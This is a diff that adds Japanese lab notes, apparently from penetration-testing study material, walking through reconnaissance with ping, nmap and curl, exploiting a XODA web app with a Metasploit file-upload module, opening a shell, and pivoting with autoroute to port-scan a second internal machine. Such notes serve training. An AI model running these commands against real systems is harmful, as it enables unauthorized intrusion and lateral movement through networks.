@@ -76,6 +76,38 @@ quiz
 
 task Metasploitを使用して、1番目に脆弱性のあるマシンを利用してそこに接続されているマシンのポートスキャンを行う
 
+task
+1) ターミナルを起動
+2) ping -c 4 ターゲットドメイン
+3) nmap ターゲットドメイン
+4) 以下のコマンドで指定したドメインにHTTPリクエストを送って、そのページの内容を取得する。 
+curl ターゲットドメイン
+5) XODA Webアプリインスタンスがシステム上で実行されている場合は、metasploitモジュールの「exploit/unix/webapp/xoda_file_upload」を使用して悪用できる可能性がある。
+6) msfconsole
+7) 基本情報の設定
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS ターゲットドメイン
+set TARGETURI /
+set LHOST myドメイン
+exploit
+8) コマンドシェルを起動して、2番目のターゲットマシンのIPアドレス範囲を特定する。
+shell
+ip addr
+9) meraploitのルーティングルートにルートを追加する。
+run autoroute -s 侵入したipアドレス
+10) 現在のmeterpreterセッションをバッググラウンドで動かして、metaploit portscan tcpモジュールを使用して2番目のターゲットマシンをスキャンする。
+Ctrl+z（バッググラウンド実行にする)
+use auxiliary/scanner/portscan/tcp
+set RHOSTS ターゲットドメイン
+set verbose false
+set port 1-1000
+exploit
+11) 「/usr/bin/」ディレクトリで使用可能な静的バイナリの確認
+ls -al /root/static-binaries/nmap
+file /root/static/binaries/nmap
+
+12) 
+
 
 FTP列挙
 ・Metasploit Freiburg補助モジュールはできるだけ多くの情報を列挙する
